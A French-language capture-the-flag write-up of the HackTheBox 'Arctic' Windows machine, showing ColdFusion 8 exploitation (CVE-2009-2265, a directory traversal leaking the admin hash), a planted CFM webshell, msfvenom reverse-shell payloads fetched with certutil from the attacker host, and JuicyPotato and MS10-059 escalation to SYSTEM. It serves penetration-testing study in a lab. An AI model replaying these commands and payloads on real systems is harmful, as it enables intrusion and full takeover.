---
title: Arctic - HacktheBox(Easy)
date: 2024-02-29 00:00:00 -500
categories: [HacktheBox]
tags: [CVE, HTB, Easy, Hacking]
image:
    path: https://i.ibb.co/x2bNLDD/ar.jpg
---
Bonsoir encore, je vais vous presentez mon writeup sur l'exploitation d'une Machine Windows de Niveau `Facile` sur HacktheBox

**Description**:

- Arctic est assez simple, mais les temps de chargement du serveur web posent quelques problèmes d'exploitation. Un dépannage de base est nécessaire pour que l'exploit fonctionne correctement.

- **[The Best Academy to Learn Hacking](https://referral.hackthebox.com/mz6xj5g)**.
- **Beginner Friendly challenges on TryHackMe [Here](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconaissance
Pour commencer, je vais lancer un `nmap` scan avec mon outil [nmapauto](https://github.com/nenandjabhata/CTFs-Journey/blob/main/Scripts/nmapauto.sh).

```terminal
─# /home/blo/tools/nmapautomate/nmapauto.sh $ip

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 18:24 CST
Initiating Ping Scan at 18:24
Scanning 10.129.136.143 [4 ports]
Completed Ping Scan at 18:24, 2.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.00s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.129.136.143 [1000 ports]
SYN Stealth Scan Timing: About 99.99% done; ETC: 18:28 (0:00:00 remaining)
Completed SYN Stealth Scan at 18:28, 231.60s elapsed (1000 total ports)
Nmap scan report for 10.129.136.143
Host is up (2.0s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

----------------------------------------------------------------------------------------------------------
Open Ports : 135,8500,49154                                                                                                                                                                  
--------------------------------
Service scan Timing: About 66.67% done; ETC: 18:33 (0:00:47 remaining)
Nmap scan report for 10.129.136.143
Host is up (0.58s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Avec mon scan, je ne trouve que 3 ports qui sont ouverts sur la Machine dont:
- **Ports 135 & 49154**: qui execute le Microsoft Windows RPC
- **Port 8500**: qui elle execute le `Flight Message Transfert Protocol`(FMTP)

En visitant le port *8500*, j'atteris sur cette page

![Page D'accueil](https://i.ibb.co/Fn05ncT/image-86.png)

Dans ces deux (2) directory, en faisant des recherchers je tombe sur une page `/administrator` qui me renvoi dans un login

![Admin](https://i.ibb.co/5T2jpnd/ad.png)

- Dans celle-ci je trouve dans le titre `Adobe ColdFusion 8 Administrator`. alors je cherche des exploits sur `Google` et sur `Searchsploit`

![Searchsploit](https://i.ibb.co/X7zytVy/cold.png)

Avec ce recherche je trouve l'exploit `50057.py` et je le copie en local. En lisant l'exploit je vois que c'est le `CVE-2009-2265`.
- J'ouvre l'exploit dans mon `Sublime texte` pour le lire un peu et le modifier au niveau des IPs, puis je lance


```terminal
─# python3 coldfusion.py         

Generating a payload...
Payload size: 1496 bytes
Saved as: c39559fbd32947c597bc9bbc08db4a9f.jsp

Priting request...
Content-type: multipart/form-data; boundary=854f29a3ce9247d89abbcf5729ffc490
Content-length: 1697

--854f29a3ce9247d89abbcf5729ffc490
Content-Disposition: form-data; name="newfile"; filename="c39559fbd32947c597bc9bbc08db4a9f.txt"
Content-Type: text/plain


Printing some information for debugging...
lhost: 10.10.16.4
lport: 1337
rhost: 10.129.136.143
rport: 8500
payload: c39559fbd32947c597bc9bbc08db4a9f.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.136.143] 49295
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

Maintenant on a bien un shell non-privilégié en tant que `tolis` dans le systeme. Nous devrons donc trouver un moyen d'escalader les privilèges.

## Exploitation Manuelle(Directory Traversal )
En faisant quelque recherche pour une exploitation manuelle et elargir ma comprehension, je trouve que ce logiel est aussi vulnerable a une Vulnerability de Directory Traversal

![Directory Traversal](https://i.ibb.co/NNBMZ6t/Screenshot-2024-02-29-at-19-04-46-Adobe-Cold-Fusion-Directory-Traversal.png)

D'ici je peux voir qu'on nous dit d'envoyer une requete `GET` dans le PATH suivant : `/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en`

En lancans cette requete sur   `Burpsuite`, on a un retour d'un mot de passe de `l'administrateur` crypte en `sha1`

![hash](https://i.ibb.co/z8kC1Zy/burp1.png)

Ainsi en utilisant `crackstation` j'arrive a le cracker

![Cracked](https://i.ibb.co/NWB1H3h/Screenshot-2024-02-29-at-19-11-03-Crack-Station-Online-Password-Hash-Cracking-MD5-SHA1-Linux-Rainbow.png)

### Shell
Maintenant que je suis dans le panel admin, je vais alors essayer d'avoir un shell sur la machine qui host ce site en injectant un fichier `CFM` malveillant qui va nous aider a executer des commandes a Distances
Pour cela il faut:
- D'abord pour trouver notre payload en `cfm`, j'ai fait quelque recherche sur Github et je suis tomber sur ce [Payload](https://github.com/reider-roque/pentest-tools/blob/master/shells/webshell.cfm) ensuite je l'ai copier en local
-  Allez dans l'onglet Settings sur la gauche et je clique sur la section "Mappings".
-   L'un des mappages par défaut est `C:\ColdFusion8\wwwroot\CFIDE`. C'est là que je vais ecrire mon shell donc je copy ce path
-   Ensuite je clique sur `Debugging and Logging` pour creer un `Scheduled Tasks` en cliquant sur `Schedule New Tasks`
-   Mettre le nom que je veux, ensuite dans l'url je met mon l'IP de mon `http.server` qui va host mon payload en `cfm` suivie du nom de payload

```terminal
 webshell.cfm
                                                                                                                                                                                             
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Cliquer sur l'option `Save output to a file`
- Mainteanant je colle  le chemin d'accès que vous avez obtenu à partir des Mappages dans le champ "File" suivie du nom de mon shell par exemple `C:\ColdFusion8\wwwroot\CFIDE/hacked.cfm`

Voici en image les explications necessaires que je viens de donnee.

![Shell file](https://i.ibb.co/4Mv2hRg/b2.png)

En cliquand sur `Submit` le site me redirige dans `http://10.129.201.72:8500/CFIDE/administrator/index.cfm` suivi des `Sheduled Tasks`.

- A partir d'ici je clique sur `Run Sheduled Tasks` Dans les icons d'`Actions`

![Shedule](https://i.ibb.co/ZJq7mSR/Screenshot-2024-02-29-at-19-47-16-Scheduled-Tasks.png)

Je retourne dans mon Terminal et je trouve que :
```terminal
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.201.72 - - [29/Feb/2024 19:46:23] "GET /webshell.cfm HTTP/1.1" 200 -
10.129.201.72 - - [29/Feb/2024 19:47:07] "GET /webshell.cfm HTTP/1.1" 200 -
```

Mon shell a bien ete telecharger sur la Box. Maintenant il faut retrouver notre fichier et l'executer.

- En sachant que mon fichier je l'ais mise sous le nom de `hacked.cfm` dans le `/CFIDE` de `C:\ColdFusion8\wwwroot\CFIDE/hacked.cfm`
- Alors en visitant le `http://10.129.201.72:8500/CFIDE/` je trouve bien mon fichier ecrite et en l'executant avec `whoami`

![Fichier](https://i.ibb.co/1TKjb8x/Screenshot-2024-02-29-at-19-58-10-Error-Occurred-While-Processing-Request.png)

Avec `curl` je vais voir ce qui est ecrite dans ce fichier


```terminal
└─# curl -s "http://10.129.201.72:8500/CFIDE/hack.txt"  
arctic\tolis
```

- Pour avoir un shell dans ma machine, je vais me creer un payload `.exe` avec `msfvenom` puis l'envoyer dans le site grace un `http.server` et en l'ecrivant dans le `C:\ColdFusion8\wwwroot\CFIDE/` et l'executer avec le `curl`

```terminal
┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1337 -f exe > reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes

┌──(root㉿xXxX)-[/home/…/CTFs/Boot2root/HTB/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Dans l'option voici ma commande : `/c "certutil.exe -urlcache -f http://10.10.16.5/reverse.exe C:\ColdFusion8\wwwroot\CFIDE/hacked.exe"` et `TimeOut` a 5
Enfin en executant le payload avec `/c C:\ColdFusion8\wwwroot\CFIDE/hacked.exe` j'obtiens

![Hacked](https://i.ibb.co/NKfzK8f/b4.png)

## Privilege Escalation
Maintenant que j'ai eu l'acces initial sur la Machine, alors maintenant je vais debuter mes recherches pour du Privilege Escalation

### 1er Methodes(SeImpersonatePrivilege)
En commençant par `systeminfo` pour avoir une idée de la version du système d'exploitation qui tourne sur la victime, ainsi que de l'architecture et des correctifs installés avec cette commande:

```terminal
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
Hotfix(s):                 N/A

C:\ColdFusion8\runtime\bin>
```
- D'apres ce resultat, on observe qu'il s'agit d'une version ancienne de Windows Server et qu'aucun correctif n'a ete installé.
<blockquote class="prompt-danger"><p>Lorsque vous trouvez un ancien système d'exploitation et qu'aucun correctif n'est installé, vous devez immédiatement penser à une . <code class="language-plaintext highlighter-rouge">exploitation du Kernel</code>.</p></blockquote>

Après avoir recueilli des informations sur l'hôte cible, j'ai vérifié les privilèges de l'utilisateur actuel tolis, comme suit :

```terminal
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\ColdFusion8\runtime\bin>
```

D'ici je peux voir que l'utilisateur `tolis` a des privileges de `SeImpersonatePrivilege` ce qui veux dire que je peux faire une attaque de `Potato` pour etre `Admin` de ce SYSTEM

<blockquote class="prompt-danger"><p>Si l'utilisateur dispose des privilèges <code class="language-plaintext highlighter-rouge">SeImpersonate, SeAssignPrimaryToken</code>alors, vous êtes alors SYSTEM.</p></blockquote>

- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

- D'abord je cree un payload

```terminal
└─# msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.5 lport=1338 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

- Puis je telecharge mon payload et mon `JuicyPotato.exe` dans la machine et dans le meme repertoire


```terminal
C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe
certutil -urlcache -split -f http://10.10.16.5/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\AppData\Local\Temp>



C:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe
certutil -urlcache -split -f http://10.10.16.5/shell.exe shell.exe
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

```

Et avec toutes ces fichiers reunie j'ouvre mon `netcat` et j'execute `JuicyPotato` avec mon payload `shell.exe`

```terminal
C:\Users\tolis\AppData\Local\Temp>.\JuicyPotato.exe -t * -p .\shell.exe -l 443
.\JuicyPotato.exe -t * -p .\shell.exe -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\tolis\AppData\Local\Temp>
```

- Dans mon Listner de `netcat`, je recois la connexion en tant que `nt authority\system`

![nc](https://i.ibb.co/kDcDGxq/b5.png)


### 2eme Methode(Kernel Exploit (MS10-059)
Au debut on avait commencer par checker le `systeminfo` et alors on a pu trouver qu'il s'agit d'une version ancienne de Windows Server et qu'aucun correctif n'a ete installé.

- Les infos

```
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600

```
Donc en cherchant quelque exploit j'ai pu tomber sur ce github

- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

Son usage est ecrit dans le github pour creer un utilisateur

```terminal
c:\> Churraskito.exe "C:\windows\system32\cmd.exe" "net user 123 123 /add"
```
Donc je vais la telecharger dans la Box cible puis l'executer comme explique


```terminal
:\Users\tolis\AppData\Local\Temp>certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe
certutil -urlcache -split -f http://10.10.16.5/MS10-059.exe MS10-059.exe
****  Online  ****
  000000  ...
  0bf800
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe
.\MS10-059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR>

```

Ici on me dit que cet exploit me donne un `Shell` si je rentre un IP specifique et un port

```terminal
C:\Users\tolis\AppData\Local\Temp>.\MS10-059.exe 10.10.16.5 1338
.\MS10-059.exe 10.10.16.5 1338
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>
C:\Users\tolis\AppData\Local\Temp>


└─# sudo rlwrap nc -lnvp 1338
listening on [any] 1338 ...
connect to [10.10.16.5] from (UNKNOWN) [10.129.201.72] 49798
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\tolis\AppData\Local\Temp>
```

Et maintenant aussi on est bien administrateur sur la Box

![Box finished](https://i.ibb.co/4N1mbkD/b6.png)

### Join Us
**Let's learn, explore, and hack together**. **Join us on Discord [here](https://discord.gg/wBT9wr9ruG)**. 